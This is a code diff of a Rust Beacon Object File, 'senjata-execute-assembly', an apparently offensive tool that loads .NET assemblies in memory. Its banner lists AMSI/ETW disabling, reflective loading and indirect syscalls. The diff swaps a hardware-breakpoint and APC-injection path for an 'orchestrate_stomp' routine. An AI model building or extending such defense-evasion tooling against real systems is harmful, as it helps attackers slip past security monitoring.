@@ -50,36 +50,17 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
     #[cfg(feature = "diag-log")]
     {
         debug_log::log(b"[bof]   args::parse ok");
-        debug_log::log_hex(b"[bof]   app_domain.len=", a.app_domain.len() as u32);
         debug_log::log_hex(b"[bof]   amsi=", a.amsi as u32);
         debug_log::log_hex(b"[bof]   etw=", a.etw as u32);
-        debug_log::log_hex(b"[bof]   mailslot=", a.mailslot as u32);
-        debug_log::log_hex(b"[bof]   entry_point=", a.entry_point);
-        debug_log::log_hex(b"[bof]   mode=", a.mode);
         debug_log::log_hex(b"[bof]   asm_bytes.len=", a.asm_bytes.len() as u32);
-        debug_log::log_hex(b"[bof]   asm_args.len=", a.asm_args.len() as u32);
     }
 
-    // Operator-visible banner. Same content as senjata-runner's banner
-    // so credit + MITRE mapping is identical regardless of --inline vs
-    // sacrificial dispatch.
-    rustbof::eprintln!("[senjata] senjata-execute-assembly v0.4.2  -  Created by DAP");
+    rustbof::eprintln!("[senjata] senjata-execute-assembly v0.5.0  -  Created by DAP");
     rustbof::eprintln!(
-        "[senjata] MITRE ATT&CK: T1620 (Reflective Code Loading) | T1055.004 (APC Injection) | T1562.001 (Disable AMSI/ETW) | T1106 (Indirect Syscalls)"
+        "[senjata] MITRE ATT&CK: T1620 (Reflective Code Loading) | T1562.001 (Disable AMSI/ETW) | T1106 (Indirect Syscalls)"
     );
-    #[cfg(feature = "diag-log")]
-    debug_log::log(b"[bof]   banner emitted");
 
     unsafe {
-        #[cfg(feature = "diag-log")]
-        debug_log::log(b"[bof] step 2: HwbpEngine::init");
-        let engine = opsec_hwbp::HwbpEngine::init()
-            .map_err(|e| BofError::Orchestrator(
-                clr_orchestrator::OrchestratorError::Hwbp(e)
-            ))?;
-        #[cfg(feature = "diag-log")]
-        debug_log::log(b"[bof]   HwbpEngine::init ok");
-
         #[cfg(feature = "diag-log")]
         unsafe extern "C" fn diag_thunk(msg: *const u8, len: usize) {
             unsafe {
@@ -89,19 +70,13 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
         }
 
         #[cfg(feature = "diag-log")]
-        debug_log::log(b"[bof] step 3: building OrchestrateInput");
-        let input = clr_orchestrator::OrchestrateInput {
-            app_domain: &a.app_domain,
-            amsi: a.amsi,
-            etw: a.etw,
-            mailslot: a.mailslot,
+        debug_log::log(b"[bof] step 2: building StompInput");
+        let input = clr_orchestrator::StompInput {
+            app_domain:  &a.app_domain,
+            pipe_name:   &a.pipe_name,
+            asm_args:    &a.asm_args,
+            asm_bytes:   &a.asm_bytes,
             entry_point: a.entry_point,
-            slot_name: &a.slot_name,
-            pipe_name: &a.pipe_name,
-            asm_args: &a.asm_args,
-            mode: a.mode,
-            main_name: &a.main_name,
-            asm_bytes: &a.asm_bytes,
             #[cfg(feature = "diag-log")]
             log_fn: Some(diag_thunk),
             #[cfg(not(feature = "diag-log"))]
@@ -109,22 +84,14 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
         };
 
         #[cfg(feature = "diag-log")]
-        debug_log::log(b"[bof] step 4: orchestrate() call");
-        let r = clr_orchestrator::orchestrate(&input, &engine);
+        debug_log::log(b"[bof] step 3: orchestrate_stomp()");
+        let r = clr_orchestrator::orchestrate_stomp(&input);
         #[cfg(feature = "diag-log")]
-        {
-            match &r {
-                Ok(()) => debug_log::log(b"[bof]   orchestrate returned Ok"),
-                Err(_) => debug_log::log(b"[bof]   orchestrate returned Err"),
-            }
+        match &r {
+            Ok(())  => debug_log::log(b"[bof]   orchestrate_stomp returned Ok"),
+            Err(_) => debug_log::log(b"[bof]   orchestrate_stomp returned Err"),
         }
         r?;
-
-        #[cfg(feature = "diag-log")]
-        debug_log::log(b"[bof] step 5: dropping HwbpEngine");
-        drop(engine);
-        #[cfg(feature = "diag-log")]
-        debug_log::log(b"[bof]   HwbpEngine dropped");
     }
     Ok(())
 }
